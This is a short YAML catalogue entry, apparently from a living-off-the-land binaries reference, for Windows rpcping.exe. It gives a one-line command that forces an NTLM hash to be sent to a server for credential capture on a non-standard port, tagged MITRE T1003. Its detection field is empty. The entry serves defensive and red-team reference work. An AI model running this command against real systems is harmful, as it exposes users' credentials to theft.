---
name: Rpcping.exe
description: Used to verify rpc connection
functions:
  credentials:
    - description: Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.
      code: rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
      mitreid: T1003
      mitrelink: https://attack.mitre.org/wiki/Technique/T1003
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Capture credentials on a non-standard port
resources:
    - resource: https://github.com/vysec/RedTips
    - resource: https://twitter.com/vysecurity/status/974806438316072960
    - resource: https://twitter.com/vysecurity/status/873181705024266241
fullpath:
    - path: C:\Windows\System32\rpcping.exe
    - path: C:\Windows\SysWOW64\rpcping.exe
detection:
  - IOC: 
acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
  - Person: Vincent Yiu
    Handle: '@vysecurity'
---
